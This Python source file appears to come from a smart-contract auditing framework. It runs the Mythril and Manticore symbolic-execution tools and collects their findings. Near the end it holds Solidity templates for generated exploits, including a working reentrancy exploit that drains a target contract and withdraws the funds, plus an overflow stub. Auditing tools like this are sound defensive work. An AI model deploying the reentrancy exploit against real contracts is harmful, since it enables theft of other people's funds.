"""
Symbolic Execution Agent for MCP Architecture

Wraps Layer 4 tools: Mythril, Manticore
Enhanced with Tool Adapters: OyenteAdapter
Publishes symbolic analysis results and execution paths to Context Bus
"""
import json
import logging
import subprocess
from typing import Dict, Any, List
from pathlib import Path
from src.agents.base_agent import BaseAgent
from src.integration.adapter_integration import integrate_symbolic_execution

logger = logging.getLogger(__name__)


class SymbolicAgent(BaseAgent):
    """
    Agent for symbolic execution (Layer 4 - MIESC)

    Capabilities:
    - Path exploration (Mythril)
    - Automated exploit generation (Manticore)
    - Constraint solving
    - Deep vulnerability discovery

    Published Context Types:
    - "symbolic_findings": Unified findings from symbolic tools
    - "mythril_results": Mythril analysis results
    - "manticore_results": Manticore execution traces
    """

    def __init__(self):
        super().__init__(
            agent_name="SymbolicAgent",
            capabilities=[
                "symbolic_execution",
                "path_exploration",
                "constraint_solving",
                "exploit_generation"
            ],
            agent_type="symbolic"
        )

    def get_context_types(self) -> List[str]:
        return [
            "symbolic_findings",
            "mythril_results",
            "manticore_results",
            "oyente_results"  # From OyenteAdapter (symbolic execution)
        ]

    def analyze(self, contract_path: str, **kwargs) -> Dict[str, Any]:
        """
        Run symbolic execution tools on contract

        Args:
            contract_path: Path to Solidity contract
            **kwargs: Optional parameters
                - max_depth: Maximum symbolic execution depth
                - timeout: Timeout per tool in seconds (default: 900)
                - solc_version: Solidity compiler version

        Returns:
            Dictionary with results from symbolic tools
        """
        results = {
            "symbolic_findings": [],
            "mythril_results": {},
            "manticore_results": {}
        }

        max_depth = kwargs.get("max_depth", 128)
        timeout = kwargs.get("timeout", 900)  # 15 minutes default
        solc_version = kwargs.get("solc_version", "0.8.0")

        # Run Mythril
        logger.info(f"SymbolicAgent: Running Mythril on {contract_path}")
        mythril_data = self._run_mythril(contract_path, timeout, solc_version)
        results["mythril_results"] = mythril_data

        # Run Manticore
        logger.info(f"SymbolicAgent: Running Manticore on {contract_path}")
        manticore_data = self._run_manticore(contract_path, max_depth, timeout)
        results["manticore_results"] = manticore_data

        # Aggregate findings from traditional tools
        results["symbolic_findings"] = self._aggregate_findings(
            mythril_data, manticore_data
        )

        # === ENHANCED: Integrate Tool Adapters (Layer 4 Enhancement) ===
        # Run OyenteAdapter for symbolic execution via Integration Layer
        # This is OPTIONAL (DPGA compliant) - agent works without it
        try:
            logger.info("SymbolicAgent: Integrating Oyente Adapter (symbolic execution)...")
            adapter_results = integrate_symbolic_execution(contract_path, **kwargs)

            # Extract Oyente-specific results
            if "adapter_results" in adapter_results:
                oyente_result = adapter_results["adapter_results"].get("oyente", {})
                results["oyente_results"] = oyente_result

                # Merge adapter findings into symbolic_findings
                if "findings" in adapter_results:
                    results["symbolic_findings"].extend(adapter_results["findings"])

                # Add symbolic execution metadata
                results["adapter_metadata"] = {
                    "vulnerability_types": adapter_results.get("metadata", {}).get("vulnerability_types", []),
                    "adapters_executed": adapter_results.get("successful", 0),
                    "adapters_failed": adapter_results.get("failed", 0)
                }

                logger.info(
                    f"SymbolicAgent: Oyente adapter completed - "
                    f"Vulnerability types: {results['adapter_metadata']['vulnerability_types']}"
                )

        except Exception as e:
            # Graceful degradation: Agent works even if adapter fails
            logger.warning(f"SymbolicAgent: Oyente adapter failed (non-critical): {e}")
            results["adapter_metadata"] = {
                "error": str(e),
                "adapters_executed": 0
            }

        return results

    def _run_mythril(self, contract_path: str, timeout: int,
                     solc_version: str) -> Dict[str, Any]:
        """
        Execute Mythril symbolic analysis

        Returns:
            Dictionary with vulnerabilities found
        """
        try:
            cmd = [
                "myth",
                "analyze",
                contract_path,
                "--solv", solc_version,
                "-o", "json"
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            # Parse JSON output
            vulnerabilities = []
            try:
                data = json.loads(result.stdout) if result.stdout else {}

                if "issues" in data:
                    for issue in data["issues"]:
                        vulnerabilities.append({
                            "swc_id": issue.get("swc-id", "UNKNOWN"),
                            "title": issue.get("title", ""),
                            "severity": issue.get("severity", "Unknown"),
                            "description": issue.get("description", ""),
                            "location": {
                                "file": issue.get("filename", "unknown"),
                                "line": issue.get("lineno", 0),
                                "function": issue.get("function", "unknown")
                            },
                            "transaction_sequence": issue.get("debug", "")
                        })

            except json.JSONDecodeError:
                logger.warning("Failed to parse Mythril JSON output")

            return {
                "tool": "Mythril",
                "vulnerabilities": vulnerabilities,
                "total_issues": len(vulnerabilities),
                "metadata": {
                    "exit_code": result.returncode,
                    "solc_version": solc_version,
                    "analysis_type": "symbolic_execution"
                }
            }

        except subprocess.TimeoutExpired:
            logger.error(f"Mythril timeout after {timeout} seconds")
            return {"error": "timeout", "vulnerabilities": []}
        except FileNotFoundError:
            logger.warning("Mythril not installed, skipping")
            return {"error": "not_installed", "vulnerabilities": []}
        except Exception as e:
            logger.error(f"Mythril execution error: {e}")
            return {"error": str(e), "vulnerabilities": []}

    def _run_manticore(self, contract_path: str, max_depth: int,
                       timeout: int) -> Dict[str, Any]:
        """
        Execute Manticore symbolic execution with enhanced exploit generation

        Returns:
            Dictionary with execution paths, exploits, and workspace findings
        """
        try:
            # Enhanced Manticore command with verbose trace and workspace
            cmd = [
                "manticore",
                contract_path,
                "--max-depth", str(max_depth),
                "--quick-mode",
                "--verbose-trace"
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            # Parse output with enhanced extraction
            output = result.stdout if result.stdout else result.stderr
            vulnerabilities = []
            exploits = []
            paths_explored = 0
            states_explored = 0

            # Extract information from output
            for line in output.split('\n'):
                line_lower = line.lower()

                # Extract paths/states explored
                if 'explored' in line_lower:
                    try:
                        if 'states' in line_lower:
                            states_explored = int(''.join(filter(str.isdigit, line)))
                        elif 'paths' in line_lower:
                            paths_explored = int(''.join(filter(str.isdigit, line)))
                    except ValueError:
                        pass

                # Detect vulnerabilities
                if 'integer overflow' in line_lower or 'integer underflow' in line_lower:
                    vulnerabilities.append({
                        "type": "integer_overflow",
                        "severity": "High",
                        "description": line.strip(),
                        "swc_id": "SWC-101",
                        "exploitable": True
                    })

                if 'reentrancy' in line_lower:
                    vulnerabilities.append({
                        "type": "reentrancy",
                        "severity": "Critical",
                        "description": line.strip(),
                        "swc_id": "SWC-107",
                        "exploitable": True
                    })

                if 'unchecked call' in line_lower:
                    vulnerabilities.append({
                        "type": "unchecked_call",
                        "severity": "Medium",
                        "description": line.strip(),
                        "swc_id": "SWC-104",
                        "exploitable": False
                    })

            # Extract findings from Manticore workspace
            workspace_findings = self._extract_workspace_findings(contract_path)
            vulnerabilities.extend(workspace_findings)

            # Generate exploits for detected vulnerabilities
            for vuln in vulnerabilities:
                if vuln.get("exploitable", False):
                    exploit_code = self._generate_exploit(
                        contract_path,
                        vuln.get("type", "unknown"),
                        vuln.get("description", "")
                    )
                    if exploit_code:
                        exploits.append({
                            "vulnerability_type": vuln.get("type"),
                            "severity": vuln.get("severity"),
                            "exploit_contract": exploit_code,
                            "swc_id": vuln.get("swc_id")
                        })

            return {
                "tool": "Manticore",
                "vulnerabilities": vulnerabilities,
                "exploits": exploits,
                "paths_explored": paths_explored,
                "states_explored": states_explored,
                "total_issues": len(vulnerabilities),
                "metadata": {
                    "exit_code": result.returncode,
                    "max_depth": max_depth,
                    "analysis_type": "symbolic_execution",
                    "exploit_generation": "enabled"
                }
            }

        except subprocess.TimeoutExpired:
            logger.error(f"Manticore timeout after {timeout} seconds")
            return {
                "error": "timeout",
                "vulnerabilities": [],
                "exploits": []
            }
        except FileNotFoundError:
            logger.warning("Manticore not installed, skipping")
            return {
                "error": "not_installed",
                "vulnerabilities": [],
                "exploits": []
            }
        except Exception as e:
            logger.error(f"Manticore execution error: {e}")
            return {
                "error": str(e),
                "vulnerabilities": [],
                "exploits": []
            }

    def _aggregate_findings(self, mythril_data: Dict,
                           manticore_data: Dict) -> List[Dict[str, Any]]:
        """
        Aggregate findings from symbolic tools into unified format

        Returns:
            List of unified findings with OWASP/SWC mapping
        """
        unified = []

        # Add Mythril vulnerabilities
        for vuln in mythril_data.get("vulnerabilities", []):
            unified.append({
                "source": "Mythril",
                "type": "symbolic_vulnerability",
                "id": vuln.get("swc_id", "UNKNOWN"),
                "title": vuln.get("title"),
                "severity": vuln.get("severity"),
                "description": vuln.get("description"),
                "location": vuln.get("location"),
                "transaction_sequence": vuln.get("transaction_sequence"),
                "layer": "symbolic",
                "swc_id": vuln.get("swc_id"),
                "owasp_category": self._map_swc_to_owasp(vuln.get("swc_id")),
                "confidence": "High"  # Mythril has high confidence
            })

        # Add Manticore vulnerabilities
        for vuln in manticore_data.get("vulnerabilities", []):
            unified.append({
                "source": "Manticore",
                "type": vuln.get("type", "symbolic_vulnerability"),
                "id": vuln.get("swc_id", "UNKNOWN"),
                "severity": vuln.get("severity", "Medium"),
                "description": vuln.get("description"),
                "layer": "symbolic",
                "swc_id": vuln.get("swc_id"),
                "owasp_category": self._map_swc_to_owasp(vuln.get("swc_id", "")),
                "confidence": "High",
                "exploitable": vuln.get("exploitable", False)
            })

        # Add Manticore exploits as separate findings
        for exploit in manticore_data.get("exploits", []):
            unified.append({
                "source": "Manticore",
                "type": "exploit_poc",
                "id": exploit.get("swc_id", "UNKNOWN"),
                "severity": exploit.get("severity", "Critical"),
                "description": f"Exploit PoC generated for {exploit.get('vulnerability_type')}",
                "layer": "symbolic",
                "swc_id": exploit.get("swc_id"),
                "owasp_category": self._map_swc_to_owasp(exploit.get("swc_id", "")),
                "confidence": "High",
                "exploitable": True,
                "exploit_contract": exploit.get("exploit_contract", "")
            })

        return unified

    def _extract_workspace_findings(self, contract_path: str) -> List[Dict[str, Any]]:
        """
        Extract findings from Manticore workspace directory

        Args:
            contract_path: Path to analyzed contract

        Returns:
            List of findings extracted from workspace
        """
        findings = []
        contract_name = Path(contract_path).stem
        workspace_pattern = f"mcore_{contract_name}_*"

        try:
            # Find Manticore workspace (created in current directory)
            workspaces = list(Path('.').glob(workspace_pattern))

            if not workspaces:
                logger.debug(f"No Manticore workspace found for {contract_name}")
                return findings

            workspace = workspaces[0]
            logger.info(f"Found Manticore workspace: {workspace}")

            # Read global.findings file
            global_findings = workspace / "global.findings"
            if global_findings.exists():
                with open(global_findings, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            findings.append({
                                "type": "workspace_finding",
                                "severity": "Medium",
                                "description": line,
                                "source": "manticore_workspace",
                                "exploitable": False
                            })

            # Count explored states
            state_dirs = list(workspace.glob("test_*"))
            logger.info(f"Manticore explored {len(state_dirs)} states")

        except Exception as e:
            logger.warning(f"Error extracting workspace findings: {e}")

        return findings

    def _generate_exploit(self, contract_path: str, vuln_type: str,
                         description: str) -> str:
        """
        Generate exploit contract code for detected vulnerability

        Args:
            contract_path: Path to vulnerable contract
            vuln_type: Type of vulnerability (reentrancy, integer_overflow, etc.)
            description: Vulnerability description

        Returns:
            Solidity exploit contract code
        """
        contract_name = Path(contract_path).stem

        if vuln_type == "reentrancy":
            return self._generate_reentrancy_exploit(contract_name)
        elif vuln_type == "integer_overflow":
            return self._generate_overflow_exploit(contract_name)
        else:
            return ""

    def _generate_reentrancy_exploit(self, contract_name: str) -> str:
        """
        Generate reentrancy exploit contract

        Args:
            contract_name: Name of vulnerable contract

        Returns:
            Solidity exploit code
        """
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{contract_name}.sol";

/**
 * @title ReentrancyExploit
 * @notice Exploit contract for reentrancy vulnerability
 * @dev FOR EDUCATIONAL AND AUDITING PURPOSES ONLY
 * @dev Generated by MIESC SymbolicAgent
 */
contract ReentrancyExploit {{
    {contract_name} public target;
    uint256 public attackAmount = 1 ether;
    uint256 public attackCount;

    event AttackInitiated(address target, uint256 amount);
    event ReentrancyExecuted(uint256 count);
    event FundsExtracted(uint256 balance);

    constructor(address _target) {{
        target = {contract_name}(_target);
    }}

    /**
     * @notice Initiate the reentrancy attack
     * @dev Requires sufficient ETH to execute
     */
    function attack() external payable {{
        require(msg.value >= attackAmount, "Insufficient ETH for attack");
        emit AttackInitiated(address(target), attackAmount);

        // Initial deposit to the vulnerable contract
        target.deposit{{value: attackAmount}}();

        // Trigger withdrawal to start reentrancy
        target.withdraw(attackAmount);
    }}

    /**
     * @notice Fallback function - executes reentrancy
     * @dev Repeatedly calls withdraw until contract is drained
     */
    receive() external payable {{
        attackCount++;
        emit ReentrancyExecuted(attackCount);

        if (address(target).balance >= attackAmount) {{
            target.withdraw(attackAmount);
        }} else {{
            emit FundsExtracted(address(this).balance);
        }}
    }}

    /**
     * @notice Withdraw stolen funds (only for demonstration)
     */
    function extractFunds() external {{
        payable(msg.sender).transfer(address(this).balance);
    }}

    /**
     * @notice Get current balance of exploit contract
     */
    function getBalance() external view returns (uint256) {{
        return address(this).balance;
    }}
}}
"""

    def _generate_overflow_exploit(self, contract_name: str) -> str:
        """
        Generate integer overflow/underflow exploit contract

        Args:
            contract_name: Name of vulnerable contract

        Returns:
            Solidity exploit code
        """
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{contract_name}.sol";

/**
 * @title IntegerOverflowExploit
 * @notice Exploit contract for integer overflow/underflow vulnerability
 * @dev FOR EDUCATIONAL AND AUDITING PURPOSES ONLY
 * @dev Generated by MIESC SymbolicAgent
 */
contract IntegerOverflowExploit {{
    {contract_name} public target;

    event OverflowTriggered(uint256 value);
    event UnderflowTriggered(uint256 value);

    constructor(address _target) {{
        target = {contract_name}(_target);
    }}

    /**
     * @notice Trigger integer overflow
     * @dev Attempts to overflow uint256 max value
     */
    function triggerOverflow() external {{
        uint256 maxValue = type(uint256).max;
        emit OverflowTriggered(maxValue);

        // Call vulnerable function with overflow value
        // Adjust this based on specific contract functions
        // target.vulnerableFunction(maxValue);
    }}

    /**
     * @notice Trigger integer underflow
     * @dev Attempts to underflow below zero
     */
    function triggerUnderflow() external {{
        emit UnderflowTriggered(0);

        // Call vulnerable function with underflow value
        // target.vulnerableFunction(0);
    }}
}}
"""

    def _map_swc_to_owasp(self, swc_id: str) -> str:
        """
        Map SWC ID to OWASP Smart Contract Top 10 category

        Args:
            swc_id: SWC identifier (e.g., "SWC-107")

        Returns:
            OWASP category string
        """
        mapping = {
            "SWC-107": "SC01-Reentrancy",
            "SWC-101": "SC03-Arithmetic",
            "SWC-104": "SC04-Unchecked-Calls",
            "SWC-105": "SC02-Access-Control",
            "SWC-106": "SC02-Access-Control",
            "SWC-110": "SC05-DoS",
            "SWC-113": "SC05-DoS",
            "SWC-114": "SC07-Front-Running",
            "SWC-115": "SC02-Access-Control",
            "SWC-116": "SC08-Time-Manipulation",
            "SWC-120": "SC06-Bad-Randomness",
            "SWC-128": "SC05-DoS"
        }
        return mapping.get(swc_id, "SC10-Unknown-Unknowns")
